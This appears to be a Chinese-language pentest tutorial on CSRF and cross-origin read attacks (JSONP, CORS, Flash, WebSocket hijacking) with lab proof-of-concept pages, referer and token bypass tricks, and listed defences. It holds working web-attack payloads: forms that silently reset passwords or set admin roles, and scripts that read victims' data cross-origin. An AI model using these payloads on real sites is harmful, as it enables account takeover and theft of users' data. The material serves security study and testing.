<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">    &lt;img src="./</span>logo.png<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;form action="</span>http:<span class="comment">//192.168.1.106/vulnerabilities/csrf/"&gt;</span></span><br><span class="line">      &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password&amp;#95;new"</span> value=<span class="string">"demos"</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password&amp;#95;conf"</span> value=<span class="string">"demos"</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"Change"</span> value=<span class="string">"Change"</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">"submit"</span> value=<span class="string">"点击查看头像"</span> /&gt;</span><br><span class="line">    &lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;form id=<span class="string">"autosubmit"</span> action=<span class="string">"http://www.example.com/api/setusername"</span> enctype=<span class="string">"text/plain"</span> method=<span class="string">"POST"</span>&amp;&gt;</span><br><span class="line">&lt;input name=<span class="string">"username"</span> type=<span class="string">"hidden"</span> value=<span class="string">"CSRFd"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Submit Request"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">document.getElementById("autosubmit").submit();</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
<h4 id="利用script标签"><a href="#利用script标签" class="headerlink" title="利用script标签"></a>利用script标签</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">"GET"</span>, <span class="string">"http://www.example.com/api/currentuser"</span>);</span><br><span class="line">xhr.send();</span><br><span class="line">&lt;<span class="regexp">/script&gt;ja</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">"POST"</span>, <span class="string">"http://www.example.com/api/setrole"</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"text/plain"</span>);</span><br><span class="line">xhr.send(<span class="string">'&#123;"role":admin&#125;'</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">"POST"</span>, <span class="string">"http://www.example.com/api/setrole"</span>);</span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/json;charset=UTF-8"</span>);</span><br><span class="line">xhr.send(<span class="string">'&#123;"role":admin&#125;'</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="从信任角度来说明CSRF与XSS的区别"><a href="#从信任角度来说明CSRF与XSS的区别" class="headerlink" title="从信任角度来说明CSRF与XSS的区别"></a>从信任角度来说明CSRF与XSS的区别</h3><p>XSS：利用用户对站点的信任（就是客户端对服务器下发的文件默认是信任的）</p>
<p>CSRF：利用站点对已经身份认证的信任（默认站点只对经过身份认证的用户是信任的）</p>
<h3 id="CSRF可能会出现的攻击场景"><a href="#CSRF可能会出现的攻击场景" class="headerlink" title="CSRF可能会出现的攻击场景"></a>CSRF可能会出现的攻击场景</h3><p>修改账号密码、个人信息（email、收货地址）</p>
<p>发送伪造的业务请求（网银、购物、投票）</p>
<p>关注他人社交账号、发送推文、留言评论等</p>
<p>未验证 Referer或者使用 Token 导致用户或者管理员可被 CSRF添加、修改、删除等操作</p>
<p>以转账为例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">初始化链接：http://www.xxx.com/pay.php?user=xx&amp;amp;money=100</span><br><span class="line">构造恶意链接：http://www.xxx.com/pay.php?user=恶意用户&amp;amp;money=10000</span><br></pre></td></tr></table></figure>
<h3 id="CSRF的执行原理图：这里就可以反应出来它与XSS的区别"><a href="#CSRF的执行原理图：这里就可以反应出来它与XSS的区别" class="headerlink" title="CSRF的执行原理图：这里就可以反应出来它与XSS的区别"></a>CSRF的执行原理图：这里就可以反应出来它与XSS的区别<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527347582.0.png" alt></h3><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>被攻击用户已经完成身份认证(已登录)</p>
<p>新请求的提交不需要重新身份认证或确认机制（如果有token机制则需要获取token，但是由于跨域的原因，攻击者构造的攻击代码无法直接请求被攻击服务器，无法获取token，但是如果配合XSS漏洞获取token，基于token的防护机制就形同虚设）</p>
<h3 id="CSRF可能存在的点以及检测方法"><a href="#CSRF可能存在的点以及检测方法" class="headerlink" title="CSRF可能存在的点以及检测方法"></a>CSRF可能存在的点以及检测方法</h3><p>寻找测试站点<strong>增删改</strong>的地方，构造HTML，修改HTML表单中某些参数，使用浏览器打开该HTML，点击提交表单后查看响应结果，看该操作是否成功执行。</p>
<p>检测方法：捕获的数据包，查看在请求和响应过程中检查是否存在anti-CSRF token名 以及验证服务器是否验证anti-CSRF token的值；检测token中的可编辑字符串（可查看以及伪造）；检查referrer头是否可以伪造绕过、查看是否有二次身份认证、验证码等防御措施。</p>
<h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><p>增加anti-CSRF token（随机token，随机性强且不易伪造，注意一点，POST请求可以隐藏在表单，如果是GET请求可以添加在cookie中）并在服务端验证</p>
<p>严格验证Referer，防止被绕过</p>
<p>关键请求使用<strong>验证码</strong>功能（比如确认转账、确认修改密码操作等，在一些其他场景使用验证码，用户体验不是很好）</p>
<p>降低会话超时时间</p>
<h3 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h3><p>burpsuit</p>
<p>CSRFTester（个人觉得不是很好用）</p>
<h3 id="绕过referer验证"><a href="#绕过referer验证" class="headerlink" title="绕过referer验证"></a>绕过referer验证</h3><p>空Referer绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">空referer头：置空</span><br><span class="line"> </span><br><span class="line">在referer字段后添加：ftp://,http://,https://,file://,javascript:,data等协议头再发送，看是否绕过referer验证。例如https向http跳转的时候referer为空，利用https://www.eval.com/attack.html</span><br></pre></td></tr></table></figure>
<p>判断referer是否存在某个关键词：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如dvwa中的验证server_name</span><br><span class="line"> </span><br><span class="line">referer判断存在不存在google.com这个关键词</span><br><span class="line"> </span><br><span class="line">在网站新建一个google.com目录 把CSRF存放在google.com目录,即可绕过</span><br></pre></td></tr></table></figure>
<p>判断referer是否有某域名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">判断了Referer开头是否以126.com以及126子域名 不验证根域名为126.com 那么我这里可以构造子域名x.126.com.xxx.com作为蠕虫传播的载体服务器，即可绕过。</span><br></pre></td></tr></table></figure>
<p>在域名前添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在域名前面增加随机的a-z和0-9也可能绕过：</span><br></pre></td></tr></table></figure>
<p>添加一些特殊的符号绕过，不同的浏览器支持的符号也不一样</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">https://xxx.com/?https://target.org   #思路和绕过URL跳转限制类似</span><br><span class="line"> </span><br><span class="line"><span class="comment">#字典如下</span></span><br><span class="line">,</span><br><span class="line">&amp;</span><br><span class="line"><span class="string">'</span></span><br><span class="line"><span class="string">"</span></span><br><span class="line"><span class="string">;</span></span><br><span class="line"><span class="string">!</span></span><br><span class="line"><span class="string">$</span></span><br><span class="line"><span class="string">^</span></span><br><span class="line"><span class="string">*</span></span><br><span class="line"><span class="string">(</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">+</span></span><br><span class="line"><span class="string">=</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">~</span></span><br><span class="line"><span class="string">-</span></span><br><span class="line"><span class="string">_</span></span><br><span class="line"><span class="string">=</span></span><br><span class="line"><span class="string">|</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">%</span></span><br></pre></td></tr></table></figure>
<p>无referer</p>
<blockquote>
<p>与添加不同的协议跳转置空referer不同，这里是直接删除referer头，利用的时候需要在body之前POC中加入meta标签</p>
</blockquote>
<p>POC</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;meta name=<span class="string">"referrer"</span> content=<span class="string">"never"</span>&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;meta name=<span class="string">"referrer"</span> content=<span class="string">"never"</span>&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">    &lt;form action="http:/</span><span class="regexp">/127.0.0.1/</span>test.php<span class="string">"&gt;</span></span><br><span class="line"><span class="string">      &lt;input type="</span>submit<span class="string">" value="</span>Submit request<span class="string">" /&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">      document.forms[0].submit();</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
<p>思路：<a href="https://gh0st.cn/archives/2018-08-01/1" target="_blank" rel="noopener">组合拳绕过referer限制</a></p>
<blockquote>
<p>反射型XSS时受到了referer限制，通过URL重定向漏洞绕过referer限制触发XSS，xss处存在jsonp劫持漏洞，如果直接触发jsonp也受到referer限制，所以通过反射性xss加载jsonp的POC再配合URL跳转漏洞触发。总体上就是URL重定向绕过了xss的referer限制，xss又绕过了jsonp的referer限制。</p>
</blockquote>
<p>以上时key师傅的思路，由于文章中的任意URL跳转也是再子域，时referer允许的，个人认为可以直接加载jsonp的POC连接绕过。</p>
<h3 id="绕过token"><a href="#绕过token" class="headerlink" title="绕过token"></a>绕过token</h3><ul>
<li>GET型token泄露：例如页面包含<code>&lt;img src=&quot;http://www.evil.com/&quot;/&gt;</code></li>
<li>POST型token泄露:利用XSS漏洞获取其Cookie，查看存储在其中的Token(组合漏洞)</li>
</ul>
<h3 id="总结bypass方法"><a href="#总结bypass方法" class="headerlink" title="总结bypass方法"></a>总结bypass方法</h3><ul>
<li>删： CSRF token 、referer、 XRSF Header</li>
<li>置空： CSRF token 、referer</li>
<li>修改请求方法：POST改为GET</li>
<li>修改 与token相同长度的任意字符串替换token</li>
<li>固定token</li>
<li>组合漏洞：XSS+CSRF(xss打token,cookie或者利用子域的xss漏洞和csrf组合绕过验证)</li>
<li>token泄露（<a href="http://www.anquan.us/static/bugs/wooyun-2015-090935.html" target="_blank" rel="noopener">referer泄露toekn</a>）</li>
</ul>
<h2 id="读取型CSRF"><a href="#读取型CSRF" class="headerlink" title="读取型CSRF"></a>读取型CSRF</h2><blockquote>
<p>前面总结的CSRF是按提交方式分的，且场景是在增删改的情况下触发的，还有一种是读类型的CSRF，由jsonp劫持和CORS跨域资源共享，Flash跨域劫持等，通过这几种方式可以读一些敏感信息出来。</p>
</blockquote>
<h3 id="jsonp劫持"><a href="#jsonp劫持" class="headerlink" title="jsonp劫持"></a>jsonp劫持</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JSONP（JSON with Padding）是数据格式JSON的一种“使用模式”，可以让网页从别的网域要数据。根据 XmlHttpRequest 对象受到同源策略的影响，而利用 &lt;script&gt;元素的这个开放策略，网页可以得到从其他来源动态产生的JSON数据，而这种使用模式就是所谓的 JSONP。用JSONP抓到的数据并不是JSON，而是任意的JavaScript，用 JavaScript解释器运行而不是用JSON解析器解析。所有，通过Chrome查看所有JSONP发送的Get请求都是js类型，而非XHR。</span><br><span class="line"> </span><br><span class="line">JSONP包含两部分：回调函数和数据。</span><br><span class="line">回调函数是当响应到来时要放在当前页面被调用的函数。</span><br><span class="line">数据就是传入回调函数中的json数据，也就是回调函数的参数了。</span><br></pre></td></tr></table></figure>
<p>jsonp劫持只需要有这个参数，再去读取这个参数就可以进行jsonp劫持了</p>
<p>jsonp劫持测试</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403076.19.png" alt></p>
<p>jsonp劫持在实际中也像上图这样调用返回一些信息，挖掘的时候利用如script标签跨域加载恶意的构造的语句即可劫持获取相应的信息</p>
<p>Poc如下所示:测试时只需要修改函数名test，以及劫持的地址即可，可以使用key写的pocbox,方便快捷</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">data</span>)</span>&#123; alert(<span class="built_in">JSON</span>.stringify(data)) &#125;&lt;<span class="regexp">/script&gt; &lt;script src="http:/</span><span class="regexp">/127.0.0.1/</span>DoraBox/csrf/jsonp.php?callback=test<span class="string">"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403500.71.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403521.67.png" alt></p>
<p>组合拳：<a href="https://xz.aliyun.com/t/5143" target="_blank" rel="noopener">JSONP绕过CSRF防护token </a></p>
<p>如果可以读取页面的CSRF-token,则可以自动加入触发写类型的CSRF，同时jsonp不只可以触发csrf漏洞，由于跨域标签，还可能会触发xss漏洞<code>?callback=&lt;script&gt;alert(1111)&lt;/script&gt;</code></p>
<p>修复方式：</p>
<ol>
<li>打乱响应主体内容</li>
<li>禁止用户自定义callback函数</li>
<li>Referer等进行限制</li>
<li>严格按照json标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）</li>
</ol>
<h3 id="CORS跨域资源共享"><a href="#CORS跨域资源共享" class="headerlink" title="CORS跨域资源共享"></a>CORS跨域资源共享</h3><blockquote>
<p>Cross-Origin Resource Sharing（CORS）跨域资源共享是一份浏览器技术的规范，提供了 Web 服务从不同域传来沙盒脚本的方法，以避开浏览器的同源策略，确保安全的跨域数据传输。现代浏览器使用CORS在API容器如XMLHttpRequest来减少HTTP请求的风险来源。与 JSONP 不同，CORS 除了 GET 要求方法以外也支持其他的 HTTP 要求。 和jsonp的作用差不多，只不过是方式有所改变，那么我们在这个漏洞中的关键点就是Orgin这个参数的传递了，有时候我们需要自己添加有时候他有，而有时候他会通过某些参数传递 。</p>
</blockquote>
<p>CORS测试</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571405767.78.png" alt></p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571403804.38.png" alt></p>
<p>如上如图，在实际的测试中，如果在返回包中出现 Access-Control-Allow-*等响应头信息则时CORS跨域设置，尝试script标签等配合XMLHttpRequest劫持获取信息。<strong>在测试的时候亲请求头中添加Origin: <a href="http://xxx.com,看返回包中的响应头是否可控，在这里时允许http://www.lsowl.top请求的，所以就允许跨域读取此网址的内容。" target="_blank" rel="noopener">http://xxx.com,看返回包中的响应头是否可控，在这里时允许http://www.lsowl.top请求的，所以就允许跨域读取此网址的内容。</a> <code>Origin</code>和<code>Referer</code>很相似，就是将当前的请求参数删除，仅剩下</strong>三元组（协议 主机 端口）<strong>，标准的浏览器（IE浏览器除外，IE浏览器只带在协议和主机），会在每次请求中都带上<code>Origin</code>，至少在跨域操作时肯定携带（例如ajax的操作） </strong></p>
<p>POC如下(利用pocbox生成)</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CORS TEST&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=<span class="string">'output'</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">            <span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">            req.onload = reqListener;</span><br><span class="line">            req.open(<span class="string">'get'</span>,<span class="string">'http://127.0.0.1/DoraBox/csrf/userinfo.php '</span>,<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//req.setRequestHeader("Content-Type","application/x-www-form-urlencoded;");</span></span><br><span class="line">            req.withCredentials = <span class="literal">true</span>;</span><br><span class="line">            req.send();</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">reqListener</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">var</span> output = <span class="built_in">document</span>.getElementById(<span class="string">'output'</span>);</span><br><span class="line">                output.innerHTML = <span class="string">"URL: http://127.0.0.1/DoraBox/csrf/userinfo.php &lt;br&gt;&lt;br&gt;Response:&lt;br&gt;&lt;textarea style='width: 659px; height: 193px;'&gt;"</span> + req.responseText + <span class="string">"&lt;/textarea&gt;"</span>;</span><br><span class="line">            &#125;;</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571404697.35.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571404749.23.png" alt></p>
<p><strong>利用CrossSiteContentHijacking测试</strong></p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571479827.75.png" alt></p>
<p>防御：</p>
<p>加强对Origin的验证，即对cors进行严格的设置</p>
<h3 id="Flash跨域"><a href="#Flash跨域" class="headerlink" title="Flash跨域"></a>Flash跨域</h3><blockquote>
<p>Flash跨域比较经典了，在做web目录资产整理的时候有时候会发现这样的文件 <strong>crossdomain.xml</strong> ，文件内容如果是如下的，那么就存在Flash跨域问题，如下内容的意思是支持所有域。flash跨域是通过.swf文件进行的，流程是：lsowl.top存在测试的swf文件想要跨域获取target.com中的敏感数据信息，首先会寻找target.com是否存在 <strong>crossdomain.xml</strong>  ，如果存在则会查看是否允许lsowl.top访问，如果可以访问则存在flash跨域漏洞。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;cross-domain-policy&gt;</span><br><span class="line">  &lt;allow-access-from domain=&quot;*&quot; /&gt;</span><br><span class="line">&lt;/cross-domain-policy&gt;</span><br></pre></td></tr></table></figure>
<p>漏洞挖掘：由于没有找到测试的站点，所以文字描述，碰见存在<strong>crossdomain.xml</strong> 的站，访问看一下配置，再找找有无数据接口，然后利用POC <a href="https://github.com/nccgroup/CrossSiteContentHijacking/raw/master/ContentHijacking/objects/ContentHijacking.swf" target="_blank" rel="noopener">https://github.com/nccgroup/CrossSiteContentHijacking/raw/master/ContentHijacking/objects/ContentHijacking.swf</a> 进行测试，或者是key师傅的<a href="https://github.com/Acmesec/PoCBox" target="_blank" rel="noopener">pocbox</a></p>
<p>emm,没图，用key师傅的图<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571406720.75.png" alt></p>
<p>防御：</p>
<p>修改<strong>crossdomain.xml</strong>限制访问来源</p>
<h2 id="可读可写型CSRF"><a href="#可读可写型CSRF" class="headerlink" title="可读可写型CSRF"></a>可读可写型CSRF</h2><blockquote>
<p>WebSocket 跨域劫持漏洞,由于websocket协议支持双通道通信且websocket不受同源策略的影响，利用websocket的跨域劫持为可读可写类型</p>
</blockquote>
<h3 id="websocket的优点"><a href="#websocket的优点" class="headerlink" title="websocket的优点"></a>websocket的优点</h3><ul>
<li>支持全双工，实时性更强。</li>
<li>更好的二进制支持。</li>
<li>较少的控制开销。连接创建后，ws客户端、服务端进行数据交换时，协议控制的数据包头部较小。在不包含头部的情况下，服务端到客户端的包头只有2~10字节（取决于数据包长度），客户端到服务端的话，需要加上额外4字节的掩码。而HTTP协议每次通信都需要携带完整的头部。</li>
<li>支持扩展。ws协议定义了扩展，用户可以扩展协议，或者实现自定义的子协议。（比如支持自定义压缩算法等）</li>
</ul>
<h3 id="websocket就建立链接如下"><a href="#websocket就建立链接如下" class="headerlink" title="websocket就建立链接如下"></a>websocket就建立链接如下<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571476121.43.png" alt></h3><p>通过建立连接的过程可以发现在websocket建立连接时没有进行验证，所以由此产生漏洞。</p>
<p><a href="https://github.com/chyingp/blog/tree/master/demo/2017.05.22-web-socket/ws" target="_blank" rel="noopener">测试环境用到代码如下</a></p>
<p><strong>server.js</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//server.js</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> app = <span class="built_in">require</span>(<span class="string">'express'</span>)();</span><br><span class="line"><span class="keyword">var</span> server = <span class="built_in">require</span>(<span class="string">'http'</span>).Server(app);</span><br><span class="line"><span class="keyword">var</span> WebSocket = <span class="built_in">require</span>(<span class="string">'ws'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> wss = <span class="keyword">new</span> WebSocket.Server(&#123; <span class="attr">port</span>: <span class="number">9999</span> &#125;);</span><br><span class="line"> </span><br><span class="line">wss.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> <span class="title">connection</span>(<span class="params">ws</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'server: receive connection.'</span>);</span><br><span class="line"> </span><br><span class="line">    ws.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> <span class="title">incoming</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'server: received %s'</span>, message);</span><br><span class="line">        ws.send(<span class="string">'server: reply'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    ws.on(<span class="string">'pong'</span>, () =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'server: received pong from client'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    ws.send(<span class="string">'world'</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// setInterval(() =&gt; &#123;</span></span><br><span class="line">    <span class="comment">//     ws.ping('', false, true);</span></span><br><span class="line">    <span class="comment">// &#125;, 2000);</span></span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.sendfile(__dirname + <span class="string">'/index.html'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>
<p><strong>cal.js</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> magic = <span class="string">'258EAFA5-E914-47DA-95CA-C5AB0DC85B11'</span>;</span><br><span class="line"><span class="keyword">const</span> secWebSocketKey = <span class="string">'w4v7O6xFTi36lq3RNcgctw=='</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> secWebSocketAccept = crypto.createHash(<span class="string">'sha1'</span>)</span><br><span class="line">    .update(secWebSocketKey + magic)</span><br><span class="line">    .digest(<span class="string">'base64'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">console</span>.log(secWebSocketAccept);</span><br><span class="line"><span class="comment">// Oy4NRAQ13jhfONC7bP8dTKb4PTU=</span></span><br></pre></td></tr></table></figure>
<p><strong>index.html</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ws demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">'ws://192.168.1.101:9999'</span>);</span></span><br><span class="line"><span class="javascript">  ws.onopen = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">'client: ws connection is open'</span>);</span></span><br><span class="line"><span class="javascript">    ws.send(<span class="string">'hello'</span>);</span></span><br><span class="line"><span class="undefined">  &#125;;</span></span><br><span class="line"><span class="javascript">  ws.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">'client: received %s'</span>, e.data);</span></span><br><span class="line"><span class="undefined">  &#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>监听服务端</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478485.67.png" alt></p>
<p>访问index.html发起请求，抓取数据包</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478624.46.png" alt></p>
<p>通过数据包可以看到，websocket通信要在http协议的基础上请求升级协议，升级的协议名为websocket,返回的数据包中说明了升级的协议以及正在连接的协议。</p>
<p>下图时通过websocket的通信过程<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478800.27.png" alt></p>
<p>在碰到使用使用websocket通信的目标时，测试方法和CORS类似， 篡改Origin，发现没有对Origin进行验证，也可以跨域进行协议升级。</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571478895.33.png" alt></p>
<h3 id="跨域劫持测试："><a href="#跨域劫持测试：" class="headerlink" title="跨域劫持测试："></a>跨域劫持测试：</h3><p>poc如下：使用pocbox生成(如果时https协议的站点则需要将ws修改为wss)</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ws_attack</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">"ws://192.168.1.101:9999"</span>);</span><br><span class="line">    ws.onopen = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">        ws.send(<span class="string">"asdfafasd"</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    ws.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">        alert(evt);</span><br><span class="line">        ws.close();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">ws_attack();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571479086.26.png" alt></p>
<p>触发</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571479187.67.png" alt></p>
<p>防御：校验Origin头 ，websocket默认不校验</p>
<h2 id="CSRF实战——DVWA"><a href="#CSRF实战——DVWA" class="headerlink" title="CSRF实战——DVWA"></a>CSRF实战——DVWA</h2><blockquote>
<p>DVWA这里关于CSRF的漏洞点是重置密码</p>
</blockquote>
